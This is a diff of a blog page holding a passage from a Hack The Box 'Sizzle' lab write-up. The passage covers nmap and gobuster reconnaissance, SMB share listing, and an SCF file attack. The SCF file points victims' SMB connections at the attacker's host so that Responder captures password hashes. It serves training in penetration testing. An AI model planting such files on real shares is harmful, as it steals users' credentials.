@@ -3,24 +3,25 @@
   <meta charset="utf-8">
   <meta http-equiv="X-UA-Compatible" content="IE=edge">
   <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.5.0 -->
-<title>Hack The Box - Sizzle | 0xRick Owned Root !</title>
-<meta name="generator" content="Jekyll v3.7.4" />
+<title>Hack The Box - Sizzle | 0xRick</title>
+<meta name="generator" content="Jekyll v3.8.5" />
 <meta property="og:title" content="Hack The Box - Sizzle" />
 <meta property="og:locale" content="en_US" />
-<meta name="description" content="Quick Summary Hey guys today Sizzle retired and here’s my write-up about it. Sizzle was a great machine, everything about it was great. It was very realistic, fun and of course challenging as it was rated Insane. Personally one of my favorites and one of the best Active Directory boxes I have ever solved. It starts by getting write access to a directory in an smb share, a simple scf file attack with responder and john could give me a password for a user. With that password I could generate a certificate request and get a certificate then a WinRm session. After that comes the most challenging part about the box which is bypassing antivirus, kerberoasting and privilege escalation but before doing that we will take a look at an unintended way first. That was the box in a nutshell, It’s a Windows box and its ip is 10.10.10.103, I added it to /etc/hosts as sizzle.htb. Let’s jump right in ! Nmap As always we will start with nmap to scan for open ports and services : nmap -sV -sT -sC sizzle.htb Full Output : ``` Nmap 7.70 scan initiated Fri May 31 19:41:35 2019 as: nmap -sV -sT -sC -o nmapinitial sizzle.htb Nmap scan report for sizzle.htb (10.10.10.103) Host is up (0.15s latency). Not shown: 987 filtered ports PORT STATE SERVICE VERSION 21/tcp open ftp Microsoft ftpd |ftp-anon: Anonymous FTP login allowed (FTP code 230) | ftp-syst: | SYST: Windows_NT 53/tcp open domain? | fingerprint-strings: | DNSVersionBindReqTCP: | version |_ bind 80/tcp open http Microsoft IIS httpd 10.0 | http-methods: |_ Potentially risky methods: TRACE |http-server-header: Microsoft-IIS/10.0 |_http-title: Site doesn’t have a title (text/html). 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: HTB.LOCAL, Site: Default-First-Site-Name) | ssl-cert: Subject: commonName=sizzle.htb.local | Not valid before: 2018-07-03T17:58:55 |_Not valid after: 2020-07-02T17:58:55 |_ssl-date: 2019-05-31T17:44:44+00:00; -6s from scanner time. 443/tcp open ssl/http Microsoft IIS httpd 10.0 |_http-server-header: Microsoft-IIS/10.0 |_http-title: Site doesn’t have a title (text/html). | ssl-cert: Subject: commonName=sizzle.htb.local | Not valid before: 2018-07-03T17:58:55 |_Not valid after: 2020-07-02T17:58:55 |_ssl-date: 2019-05-31T17:44:41+00:00; -6s from scanner time. | tls-alpn: | h2 | http/1.1 445/tcp open microsoft-ds? 464/tcp open kpasswd5? 593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 636/tcp open ssl/ldap Microsoft Windows Active Directory LDAP (Domain: HTB.LOCAL, Site: Default-First-Site-Name) | ssl-cert: Subject: commonName=sizzle.htb.local | Not valid before: 2018-07-03T17:58:55 |_Not valid after: 2020-07-02T17:58:55 |_ssl-date: 2019-05-31T17:44:43+00:00; -5s from scanner time. 3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: HTB.LOCAL, Site: Default-First-Site-Name) | ssl-cert: Subject: commonName=sizzle.htb.local | Not valid before: 2018-07-03T17:58:55 |_Not valid after: 2020-07-02T17:58:55 |_ssl-date: 2019-05-31T17:44:42+00:00; -6s from scanner time. 3269/tcp open ssl/ldap Microsoft Windows Active Directory LDAP (Domain: HTB.LOCAL, Site: Default-First-Site-Name) | ssl-cert: Subject: commonName=sizzle.htb.local | Not valid before: 2018-07-03T17:58:55 |_Not valid after: 2020-07-02T17:58:55 |_ssl-date: 2019-05-31T17:44:41+00:00; -6s from scanner time. 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service : SF-Port53-TCP:V=7.70%I=7%D=5/31%Time=5CF1678A%P=i686-pc-linux-gnu%r(DNSVer SF:sionBindReqTCP,20,”\0\x1e\0\x06\x81\x04\0\x01\0\0\0\0\0\0\x07version\x0 SF:4bind\0\0\x10\0\x03”); Service Info: Host: SIZZLE; OS: Windows; CPE: cpe:/o:microsoft:windows" />
-<meta property="og:description" content="Quick Summary Hey guys today Sizzle retired and here’s my write-up about it. Sizzle was a great machine, everything about it was great. It was very realistic, fun and of course challenging as it was rated Insane. Personally one of my favorites and one of the best Active Directory boxes I have ever solved. It starts by getting write access to a directory in an smb share, a simple scf file attack with responder and john could give me a password for a user. With that password I could generate a certificate request and get a certificate then a WinRm session. After that comes the most challenging part about the box which is bypassing antivirus, kerberoasting and privilege escalation but before doing that we will take a look at an unintended way first. That was the box in a nutshell, It’s a Windows box and its ip is 10.10.10.103, I added it to /etc/hosts as sizzle.htb. Let’s jump right in ! Nmap As always we will start with nmap to scan for open ports and services : nmap -sV -sT -sC sizzle.htb Full Output : ``` Nmap 7.70 scan initiated Fri May 31 19:41:35 2019 as: nmap -sV -sT -sC -o nmapinitial sizzle.htb Nmap scan report for sizzle.htb (10.10.10.103) Host is up (0.15s latency). Not shown: 987 filtered ports PORT STATE SERVICE VERSION 21/tcp open ftp Microsoft ftpd |ftp-anon: Anonymous FTP login allowed (FTP code 230) | ftp-syst: | SYST: Windows_NT 53/tcp open domain? | fingerprint-strings: | DNSVersionBindReqTCP: | version |_ bind 80/tcp open http Microsoft IIS httpd 10.0 | http-methods: |_ Potentially risky methods: TRACE |http-server-header: Microsoft-IIS/10.0 |_http-title: Site doesn’t have a title (text/html). 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: HTB.LOCAL, Site: Default-First-Site-Name) | ssl-cert: Subject: commonName=sizzle.htb.local | Not valid before: 2018-07-03T17:58:55 |_Not valid after: 2020-07-02T17:58:55 |_ssl-date: 2019-05-31T17:44:44+00:00; -6s from scanner time. 443/tcp open ssl/http Microsoft IIS httpd 10.0 |_http-server-header: Microsoft-IIS/10.0 |_http-title: Site doesn’t have a title (text/html). | ssl-cert: Subject: commonName=sizzle.htb.local | Not valid before: 2018-07-03T17:58:55 |_Not valid after: 2020-07-02T17:58:55 |_ssl-date: 2019-05-31T17:44:41+00:00; -6s from scanner time. | tls-alpn: | h2 | http/1.1 445/tcp open microsoft-ds? 464/tcp open kpasswd5? 593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 636/tcp open ssl/ldap Microsoft Windows Active Directory LDAP (Domain: HTB.LOCAL, Site: Default-First-Site-Name) | ssl-cert: Subject: commonName=sizzle.htb.local | Not valid before: 2018-07-03T17:58:55 |_Not valid after: 2020-07-02T17:58:55 |_ssl-date: 2019-05-31T17:44:43+00:00; -5s from scanner time. 3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: HTB.LOCAL, Site: Default-First-Site-Name) | ssl-cert: Subject: commonName=sizzle.htb.local | Not valid before: 2018-07-03T17:58:55 |_Not valid after: 2020-07-02T17:58:55 |_ssl-date: 2019-05-31T17:44:42+00:00; -6s from scanner time. 3269/tcp open ssl/ldap Microsoft Windows Active Directory LDAP (Domain: HTB.LOCAL, Site: Default-First-Site-Name) | ssl-cert: Subject: commonName=sizzle.htb.local | Not valid before: 2018-07-03T17:58:55 |_Not valid after: 2020-07-02T17:58:55 |_ssl-date: 2019-05-31T17:44:41+00:00; -6s from scanner time. 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service : SF-Port53-TCP:V=7.70%I=7%D=5/31%Time=5CF1678A%P=i686-pc-linux-gnu%r(DNSVer SF:sionBindReqTCP,20,”\0\x1e\0\x06\x81\x04\0\x01\0\0\0\0\0\0\x07version\x0 SF:4bind\0\0\x10\0\x03”); Service Info: Host: SIZZLE; OS: Windows; CPE: cpe:/o:microsoft:windows" />
+<meta name="description" content="My write-up for Sizzle from Hack The Box." />
+<meta property="og:description" content="My write-up for Sizzle from Hack The Box." />
 <link rel="canonical" href="http://localhost:4000/hack-the-box/sizzle/" />
 <meta property="og:url" content="http://localhost:4000/hack-the-box/sizzle/" />
-<meta property="og:site_name" content="0xRick Owned Root !" />
+<meta property="og:site_name" content="0xRick" />
 <meta property="og:image" content="http://localhost:4000/hackthebox/sizzle/0.png" />
 <meta property="og:type" content="article" />
 <meta property="article:published_time" content="2019-06-01T00:00:00+02:00" />
 <script type="application/ld+json">
-{"description":"Quick Summary Hey guys today Sizzle retired and here’s my write-up about it. Sizzle was a great machine, everything about it was great. It was very realistic, fun and of course challenging as it was rated Insane. Personally one of my favorites and one of the best Active Directory boxes I have ever solved. It starts by getting write access to a directory in an smb share, a simple scf file attack with responder and john could give me a password for a user. With that password I could generate a certificate request and get a certificate then a WinRm session. After that comes the most challenging part about the box which is bypassing antivirus, kerberoasting and privilege escalation but before doing that we will take a look at an unintended way first. That was the box in a nutshell, It’s a Windows box and its ip is 10.10.10.103, I added it to /etc/hosts as sizzle.htb. Let’s jump right in ! Nmap As always we will start with nmap to scan for open ports and services : nmap -sV -sT -sC sizzle.htb Full Output : ``` Nmap 7.70 scan initiated Fri May 31 19:41:35 2019 as: nmap -sV -sT -sC -o nmapinitial sizzle.htb Nmap scan report for sizzle.htb (10.10.10.103) Host is up (0.15s latency). Not shown: 987 filtered ports PORT STATE SERVICE VERSION 21/tcp open ftp Microsoft ftpd |ftp-anon: Anonymous FTP login allowed (FTP code 230) | ftp-syst: | SYST: Windows_NT 53/tcp open domain? | fingerprint-strings: | DNSVersionBindReqTCP: | version |_ bind 80/tcp open http Microsoft IIS httpd 10.0 | http-methods: |_ Potentially risky methods: TRACE |http-server-header: Microsoft-IIS/10.0 |_http-title: Site doesn’t have a title (text/html). 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: HTB.LOCAL, Site: Default-First-Site-Name) | ssl-cert: Subject: commonName=sizzle.htb.local | Not valid before: 2018-07-03T17:58:55 |_Not valid after: 2020-07-02T17:58:55 |_ssl-date: 2019-05-31T17:44:44+00:00; -6s from scanner time. 443/tcp open ssl/http Microsoft IIS httpd 10.0 |_http-server-header: Microsoft-IIS/10.0 |_http-title: Site doesn’t have a title (text/html). | ssl-cert: Subject: commonName=sizzle.htb.local | Not valid before: 2018-07-03T17:58:55 |_Not valid after: 2020-07-02T17:58:55 |_ssl-date: 2019-05-31T17:44:41+00:00; -6s from scanner time. | tls-alpn: | h2 | http/1.1 445/tcp open microsoft-ds? 464/tcp open kpasswd5? 593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 636/tcp open ssl/ldap Microsoft Windows Active Directory LDAP (Domain: HTB.LOCAL, Site: Default-First-Site-Name) | ssl-cert: Subject: commonName=sizzle.htb.local | Not valid before: 2018-07-03T17:58:55 |_Not valid after: 2020-07-02T17:58:55 |_ssl-date: 2019-05-31T17:44:43+00:00; -5s from scanner time. 3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: HTB.LOCAL, Site: Default-First-Site-Name) | ssl-cert: Subject: commonName=sizzle.htb.local | Not valid before: 2018-07-03T17:58:55 |_Not valid after: 2020-07-02T17:58:55 |_ssl-date: 2019-05-31T17:44:42+00:00; -6s from scanner time. 3269/tcp open ssl/ldap Microsoft Windows Active Directory LDAP (Domain: HTB.LOCAL, Site: Default-First-Site-Name) | ssl-cert: Subject: commonName=sizzle.htb.local | Not valid before: 2018-07-03T17:58:55 |_Not valid after: 2020-07-02T17:58:55 |_ssl-date: 2019-05-31T17:44:41+00:00; -6s from scanner time. 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service : SF-Port53-TCP:V=7.70%I=7%D=5/31%Time=5CF1678A%P=i686-pc-linux-gnu%r(DNSVer SF:sionBindReqTCP,20,”\\0\\x1e\\0\\x06\\x81\\x04\\0\\x01\\0\\0\\0\\0\\0\\0\\x07version\\x0 SF:4bind\\0\\0\\x10\\0\\x03”); Service Info: Host: SIZZLE; OS: Windows; CPE: cpe:/o:microsoft:windows","@type":"BlogPosting","url":"http://localhost:4000/hack-the-box/sizzle/","image":"http://localhost:4000/hackthebox/sizzle/0.png","headline":"Hack The Box - Sizzle","dateModified":"2019-06-01T00:00:00+02:00","datePublished":"2019-06-01T00:00:00+02:00","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/hack-the-box/sizzle/"},"@context":"http://schema.org"}</script>
+{"description":"My write-up for Sizzle from Hack The Box.","@type":"BlogPosting","url":"http://localhost:4000/hack-the-box/sizzle/","image":"http://localhost:4000/hackthebox/sizzle/0.png","headline":"Hack The Box - Sizzle","dateModified":"2019-06-01T00:00:00+02:00","datePublished":"2019-06-01T00:00:00+02:00","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/hack-the-box/sizzle/"},"@context":"http://schema.org"}</script>
 <!-- End Jekyll SEO tag -->
-<link rel="stylesheet" href="/assets/css/tagbuttons.css">
-  <link rel="stylesheet" href="/assets/css/ad.css">
-  <link rel="stylesheet" href="/assets/css/style.css"><link type="application/atom+xml" rel="alternate" href="http://localhost:4000/feed.xml" title="0xRick Owned Root !" /></head>
+<link rel="stylesheet" href="/assets/css/ad.css">
+  <link rel="stylesheet" href="/assets/css/style.css">
+  <link rel="icon" type="image/png" href="/assets/favicon.png" /><link type="application/atom+xml" rel="alternate" href="http://localhost:4000/feed.xml" title="0xRick" /><script defer src="https://use.fontawesome.com/releases/v5.8.1/js/all.js" integrity="sha384-g5uSoOSBd7KkhAMlnQILrecXvzst9TdC09/VM+pjDTCM+1il8RHz5fKANTFFb+gQ" crossorigin="anonymous"></script>
+</head>
 <!-- Global site tag (gtag.js) - Google Analytics -->
 <script async src="https://www.googletagmanager.com/gtag/js?id=UA-97164925-2"></script>
 <script>
@@ -31,64 +32,66 @@
   gtag('config', 'UA-97164925-2');
 </script>
 
-<body><header class="site-header" role="banner">
-
-  <div class="wrapper"><a class="site-title" rel="author" href="/">0xRick Owned Root !</a><nav class="site-nav">
-        <input type="checkbox" id="nav-trigger" class="nav-trigger" />
-        <label for="nav-trigger">
-          <span class="menu-icon">
-            <svg viewBox="0 0 18 15" width="18px" height="15px">
-              <path d="M18,1.484c0,0.82-0.665,1.484-1.484,1.484H1.484C0.665,2.969,0,2.304,0,1.484l0,0C0,0.665,0.665,0,1.484,0 h15.032C17.335,0,18,0.665,18,1.484L18,1.484z M18,7.516C18,8.335,17.335,9,16.516,9H1.484C0.665,9,0,8.335,0,7.516l0,0 c0-0.82,0.665-1.484,1.484-1.484h15.032C17.335,6.031,18,6.696,18,7.516L18,7.516z M18,13.516C18,14.335,17.335,15,16.516,15H1.484 C0.665,15,0,14.335,0,13.516l0,0c0-0.82,0.665-1.483,1.484-1.483h15.032C17.335,12.031,18,12.695,18,13.516L18,13.516z"/>
-            </svg>
-          </span>
-        </label>
-
-        <div class="trigger"><a class="page-link" href="/about/">About</a><a class="page-link" href="/categories/">Categories</a><a class="page-link" href="/tags/">Tags</a></div>
-      </nav></div>
-</header>
+<body><div class="site-header">
+  <div class="wrapper">
+    <a class="site-title" rel="author" href="/">0xRick<b class="command_prompt"></b><b class="blinking_cursor">_</b></a>
+    <span class="social_links">
+        <a class="color-cyan-hover" href="https://twitter.com/Ahm3d_H3sham/"><i class="fab fa-twitter-square"></i></a><a class="color-blue-hover" href="https://facebook.com/Ahm3d.H3sham/"><i class="fab fa-facebook-square"></i></a><a class="color-purple-hover" href="https://github.com/0xRick"><i class="fab fa-github-square"></i></a>
+    </span>
+  </div>
+</div>
 <main class="page-content" aria-label="Content">
       <div class="wrapper">
-        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+        <div class="author-box">
+<img src="/avatar.png" class="author-avatar" />
+<h7>
+	Ahmed Hesham<br>
+	CyberSec/InfoSec enthusiast. <br>
+	Interested in knowing how things work/Interested in breaking them, always learning.
+</h7>
+</div>
 
-  <header class="post-header">
-    <h1 class="post-title p-name" itemprop="name headline">Hack The Box - Sizzle</h1>
-    <p class="post-meta">
-      <h7>
-        Tags: 
-        
-        <button class="tagbutton" onclick="window.location.href = '/tags/Windows/';">Windows</button> 
-        
-        <button class="tagbutton" onclick="window.location.href = '/tags/Active Directory/';">Active Directory</button> 
-        
-        <button class="tagbutton" onclick="window.location.href = '/tags/Windows Exploitation/';">Windows Exploitation</button> 
-        
-        <button class="tagbutton" onclick="window.location.href = '/tags/Networking/';">Networking</button> 
-        
-        <button class="tagbutton" onclick="window.location.href = '/tags/smb/';">smb</button> 
-        
-      </h7>
-      <br>
-      <time class="dt-published" datetime="2019-06-01T00:00:00+02:00" itemprop="datePublished">Jun 1, 2019
-      </time><script async type="text/javascript" src="//cdn.carbonads.com/carbon.js?serve=CK7DL23U&placement=0xrickgithubio" id="_carbonads_js"></script>
-</p>
-  </header>
+  <br>
+<div>
+	<h7>  &nbsp; Ad </h7>
+	<script async type="text/javascript" src="//cdn.carbonads.com/carbon.js?serve=CK7DL23U&placement=0xrickgithubio" id="_carbonads_js"></script>
+</div>
+<div class="post">
+  <h1 class="post-title">Hack The Box - Sizzle</h1>
+  
+  <div class="post-tags">
+      
+      <a class="tag" href="/tag/windows/">windows</a>
+      
+      <a class="tag" href="/tag/active-directory/">active-directory</a>
+      
+      <a class="tag" href="/tag/windows-exploitation/">windows-exploitation</a>
+      
+      <a class="tag" href="/tag/networking/">networking</a>
+      
+      <a class="tag" href="/tag/smb/">smb</a>
+      
+  </div>
+  
+  <div class="post-date">Published on 01 Jun 2019</div>
+  
+  <div class="post-description">My write-up for Sizzle from Hack The Box.</div>
+  
+  <hr />
 
-  <div class="post-content e-content" itemprop="articleBody">
-    <hr />
-
-<h3 id="quick-summary">Quick Summary</h3>
-<h4 id="hey-guys-today-sizzle-retired-and-heres-my-write-up-about-it-sizzle-was-a-great-machine-everything-about-it-was-great-it-was-very-realistic-fun-and-of-course-challenging-as-it-was-rated-insane-personally-one-of-my-favorites-and-one-of-the-best-active-directory-boxes-i-have-ever-solved-it-starts-by-getting-write-access-to-a-directory-in-an-smb-share-a-simple-scf-file-attack-with-responder-and-john-could-give-me-a-password-for-a-user-with-that-password-i-could-generate-a-certificate-request-and-get-a-certificate-then-a-winrm-session-after-that-comes-the-most-challenging-part-about-the-box-which-is-bypassing-antivirus-kerberoasting-and-privilege-escalation-but-before-doing-that-we-will-take-a-look-at-an-unintended-way-first-that-was-the-box-in-a-nutshell-its-a-windows-box-and-its-ip-is-101010103-i-added-it-to-etchosts-as-sizzlehtb-lets-jump-right-in-">Hey guys today Sizzle retired and here’s my write-up about it. Sizzle was a great machine, everything about it was great. It was very realistic, fun and of course challenging as it was rated Insane. Personally one of my favorites and one of the best Active Directory boxes I have ever solved. It starts by getting write access to a directory in an <code class="highlighter-rouge">smb</code> share, a simple <code class="highlighter-rouge">scf</code> file attack with <code class="highlighter-rouge">responder</code> and <code class="highlighter-rouge">john</code> could give me a password for a user. With that password I could generate a certificate request and get a certificate then a <code class="highlighter-rouge">WinRm</code> session. After that comes the most challenging part about the box which is bypassing antivirus, kerberoasting and privilege escalation but before doing that we will take a look at an unintended way first. That was the box in a nutshell, It’s a Windows box and its ip is <code class="highlighter-rouge">10.10.10.103</code>, I added it to <code class="highlighter-rouge">/etc/hosts</code> as <code class="highlighter-rouge">sizzle.htb</code>. Let’s jump right in !</h4>
-<p><img src="/images/hackthebox/sizzle/0.png" alt="" /></p>
+<h2 id="quick-summary">Quick Summary</h2>
+<p><br /> Hey guys today Sizzle retired and here’s my write-up about it. Sizzle was a great machine, everything about it was great. It was very realistic, fun and of course challenging as it was rated Insane. Personally one of my favorites and one of the best Active Directory boxes I have ever solved. It starts by getting write access to a directory in an <code class="highlighter-rouge">smb</code> share, a simple <code class="highlighter-rouge">scf</code> file attack with <code class="highlighter-rouge">responder</code> and <code class="highlighter-rouge">john</code> could give me a password for a user. With that password I could generate a certificate request and get a certificate then a <code class="highlighter-rouge">WinRm</code> session. After that comes the most challenging part about the box which is bypassing antivirus, kerberoasting and privilege escalation but before doing that we will take a look at an unintended way first. That was the box in a nutshell, It’s a Windows box and its ip is <code class="highlighter-rouge">10.10.10.103</code>, I added it to <code class="highlighter-rouge">/etc/hosts</code> as <code class="highlighter-rouge">sizzle.htb</code>. Let’s jump right in !
+<img src="/images/hackthebox/sizzle/0.png" alt="" /></p>
 <hr />
 
-<h3 id="nmap">Nmap</h3>
-<h4 id="as-always-we-will-start-with-nmap-to-scan-for-open-ports-and-services-">As always we will start with <code class="highlighter-rouge">nmap</code> to scan for open ports and services :</h4>
-<p><code class="highlighter-rouge">nmap -sV -sT -sC sizzle.htb</code>
+<h2 id="nmap">Nmap</h2>
+<p><br /> As always we will start with <code class="highlighter-rouge">nmap</code> to scan for open ports and services :
+<code class="highlighter-rouge">nmap -sV -sT -sC sizzle.htb</code>
 <img src="/images/hackthebox/sizzle/1.png" alt="" />
 <br />
 <br />
-<img src="/images/hackthebox/sizzle/2.png" alt="" /></p>
-<h4 id="full-output-">Full Output :</h4>
+<img src="/images/hackthebox/sizzle/2.png" alt="" />
+<br /> Full Output :</p>
 <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code># Nmap 7.70 scan initiated Fri May 31 19:41:35 2019 as: nmap -sV -sT -sC -o nmapinitial sizzle.htb
 Nmap scan report for sizzle.htb (10.10.10.103)
 Host is up (0.15s latency).
@@ -161,18 +164,18 @@ Host script results:
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 # Nmap done at Fri May 31 19:45:27 2019 -- 1 IP address (1 host up) scanned in 232.62 seconds
 </code></pre></div></div>
-<h4 id="we-got-a-lot-of-ports-we-got-ftp-on-port-21-dns-on-port-53-http-on-port-80-smb-and-ldap-we-also-see-that-the-domain-is-htblocal-and-commonname-is-sizzlehtblocal-so-i-added-it-to-etchosts-">We got a lot of ports, we got <code class="highlighter-rouge">ftp</code> on port 21, <code class="highlighter-rouge">dns</code> on port 53, <code class="highlighter-rouge">http</code> on port 80, <code class="highlighter-rouge">smb</code> and <code class="highlighter-rouge">ldap</code>. We also see that the domain is <code class="highlighter-rouge">HTB.LOCAL</code> and commonName is <code class="highlighter-rouge">sizzle.htb.local</code>, so I added it to <code class="highlighter-rouge">/etc/hosts</code> :</h4>
-<p><img src="/images/hackthebox/sizzle/3.png" alt="" /></p>
-<h4 id="anonymous-authentication-on-ftp-was-allowed-but-there-was-nothing-there-so-i-will-skip-that">anonymous authentication on <code class="highlighter-rouge">ftp</code> was allowed but there was nothing there so I will skip that.</h4>
+<p><br /> We got a lot of ports, we got <code class="highlighter-rouge">ftp</code> on port 21, <code class="highlighter-rouge">dns</code> on port 53, <code class="highlighter-rouge">http</code> on port 80, <code class="highlighter-rouge">smb</code> and <code class="highlighter-rouge">ldap</code>. We also see that the domain is <code class="highlighter-rouge">HTB.LOCAL</code> and commonName is <code class="highlighter-rouge">sizzle.htb.local</code>, so I added it to <code class="highlighter-rouge">/etc/hosts</code> :
+<img src="/images/hackthebox/sizzle/3.png" alt="" />
+<br /> anonymous authentication on <code class="highlighter-rouge">ftp</code> was allowed but there was nothing there so I will skip that.</p>
 <hr />
 
-<h3 id="http">HTTP</h3>
-<h4 id="i-checked-that-http-server-and-the-index-only-had-this-gif-">I checked that <code class="highlighter-rouge">http</code> server and the index only had this <code class="highlighter-rouge">gif</code> :</h4>
-<p><img src="/images/hackthebox/sizzle/4.png" alt="" />
+<h2 id="http">HTTP</h2>
+<p><br /> I checked that <code class="highlighter-rouge">http</code> server and the index only had this <code class="highlighter-rouge">gif</code> :
+<img src="/images/hackthebox/sizzle/4.png" alt="" />
 <br />
 <br />
-<img src="/images/hackthebox/sizzle/5.png" alt="" /></p>
-<h4 id="so-i-ran-gobuster-">So I ran <code class="highlighter-rouge">gobuster</code> :</h4>
+<img src="/images/hackthebox/sizzle/5.png" alt="" />
+<br /> So I ran <code class="highlighter-rouge">gobuster</code> :</p>
 <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>=====================================================
 Gobuster v2.0.0              OJ Reeves (@TheColonial)
 =====================================================
@@ -194,56 +197,56 @@ Gobuster v2.0.0              OJ Reeves (@TheColonial)
 2019/05/31 19:53:24 Finished
 =====================================================
 </code></pre></div></div>
-<h4 id="certenroll-sounds-interesting-but-unfortunately-its-a-403-"><code class="highlighter-rouge">/certenroll</code> sounds interesting, but unfortunately it’s a <code class="highlighter-rouge">403</code> :</h4>
-<p><img src="/images/hackthebox/sizzle/6.png" alt="" /></p>
-<h4 id="its-time-to-check-smb-">It’s time to check <code class="highlighter-rouge">smb</code> .</h4>
-<p><br /></p>
+<p><br /> <code class="highlighter-rouge">/certenroll</code> sounds interesting, but unfortunately it’s a <code class="highlighter-rouge">403</code> :
+<img src="/images/hackthebox/sizzle/6.png" alt="" />
+<br /> It’s time to check <code class="highlighter-rouge">smb</code> .
+<br /></p>
 <hr />
 
-<h3 id="smb-scf-file-attack-amandas-credentials">SMB, SCF File Attack, amanda’s Credentials</h3>
-<h4 id="first-thing-we-need-to-know-is-the-shares-we-can-use-smbclient-to-list-the-shares-">First thing we need to know is the shares, we can use <code class="highlighter-rouge">smbclient</code> to list the shares :</h4>
-<p><code class="highlighter-rouge">smbclient --list //sizzle.htb/ -U ""</code>
-<img src="/images/hackthebox/sizzle/7.png" alt="" /></p>
-<h4 id="i-noticed-that-there-was-a-share-for-active-directory-certificate-services-most-likely-certsrv-will-be-on-the-web-server-">I noticed that there was a share for Active Directory Certificate Services. Most likely <code class="highlighter-rouge">/certsrv</code> will be on the web server :</h4>
-<p><code class="highlighter-rouge">http://sizzle.htb/certsrv</code>
-<img src="/images/hackthebox/sizzle/8.png" alt="" /></p>
-<h4 id="yes-it-was-there-and-we-need-credentials-back-to-smb-the-only-share-i-could-access-anonymously-was-department-shares-">Yes it was there, and we need credentials. Back to <code class="highlighter-rouge">smb</code> the only share I could access anonymously was <code class="highlighter-rouge">Department Shares</code> :</h4>
-<p><img src="/images/hackthebox/sizzle/9.png" alt="" /></p>
-<h4 id="it-had-a-lot-of-directories-i-could-write-to-2-of-them---zz_archive-and-userspublic">It had a lot of directories, I could write to 2 of them :  <code class="highlighter-rouge">ZZ_ARCHIVE</code> and <code class="highlighter-rouge">Users/Public</code>.</h4>
-<p><img src="/images/hackthebox/sizzle/10.png" alt="" /></p>
-<h4 id="we-are-looking-for-credentials-since-we-can-write-to-one-of-the-directories-then-we-can-possibly-apply-an-scf-file-attack-you-can-read-about-it-here-we-are-going-to-put-an-scf-file-in-userspublic-it-looks-like-this-">We are looking for credentials. Since we can write to one of the directories then we can possibly apply an <code class="highlighter-rouge">scf</code> file attack. You can read about it <a href="https://pentestlab.blog/2017/12/13/smb-share-scf-file-attacks/">here</a>. We are going to put an <code class="highlighter-rouge">scf</code> file in <code class="highlighter-rouge">Users/Public</code>. It looks like this :</h4>
-<p><img src="/images/hackthebox/sizzle/11.png" alt="" /></p>
+<h2 id="smb-scf-file-attack-amandas-credentials">SMB, SCF File Attack, amanda’s Credentials</h2>
+<p><br /> First thing we need to know is the shares, we can use <code class="highlighter-rouge">smbclient</code> to list the shares :
+<code class="highlighter-rouge">smbclient --list //sizzle.htb/ -U ""</code>
+<img src="/images/hackthebox/sizzle/7.png" alt="" />
+<br /> I noticed that there was a share for Active Directory Certificate Services. Most likely <code class="highlighter-rouge">/certsrv</code> will be on the web server :
+<code class="highlighter-rouge">http://sizzle.htb/certsrv</code>
+<img src="/images/hackthebox/sizzle/8.png" alt="" />
+<br /> Yes it was there, and we need credentials. Back to <code class="highlighter-rouge">smb</code> the only share I could access anonymously was <code class="highlighter-rouge">Department Shares</code> :
+<img src="/images/hackthebox/sizzle/9.png" alt="" />
+<br /> It had a lot of directories, I could write to 2 of them :  <code class="highlighter-rouge">ZZ_ARCHIVE</code> and <code class="highlighter-rouge">Users/Public</code>. 
+<img src="/images/hackthebox/sizzle/10.png" alt="" />
+<br /> We are looking for credentials. Since we can write to one of the directories then we can possibly apply an <code class="highlighter-rouge">scf</code> file attack. You can read about it <a href="https://pentestlab.blog/2017/12/13/smb-share-scf-file-attacks/">here</a>. We are going to put an <code class="highlighter-rouge">scf</code> file in <code class="highlighter-rouge">Users/Public</code>. It looks like this :
+<img src="/images/hackthebox/sizzle/11.png" alt="" /></p>
 <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[Shell]
 Command=2
 IconFile=\\10.10.xx.xx\share\rick.ico
 [Taskbar]
 Command=ToggleDesktop
 </code></pre></div></div>
-<h4 id="then-we-will-run-responder-whenever-a-user-browses-that-directory-he-will-automatically-try-to-connect-to-my-box-through-smb-thats-when-responder-catches-the-hashes-more-info-in-the-link-above">Then we will run <code class="highlighter-rouge">responder</code>. Whenever a user browses that directory he will automatically try to connect to my box through <code class="highlighter-rouge">smb</code>, that’s when <code class="highlighter-rouge">responder</code> catches the hashes. More info in the link above.</h4>
-<p><img src="/images/hackthebox/sizzle/12.png" alt="" />
+<p><br /> Then we will run <code class="highlighter-rouge">responder</code>. Whenever a user browses that directory he will automatically try to connect to my box through <code class="highlighter-rouge">smb</code>, that’s when <code class="highlighter-rouge">responder</code> catches the hashes. More info in the link above. 
+<img src="/images/hackthebox/sizzle/12.png" alt="" />
 <br />
 <br />
 <code class="highlighter-rouge">reponder -I tun0</code>
-<img src="/images/hackthebox/sizzle/13.png" alt="" /></p>
-<h4 id="responder-caught-hash-for-a-user-called-amanda-lets-crack-it-with-john-"><code class="highlighter-rouge">responder</code> caught hash for a user called <code class="highlighter-rouge">amanda</code>. Let’s crack it with <code class="highlighter-rouge">john</code> :</h4>
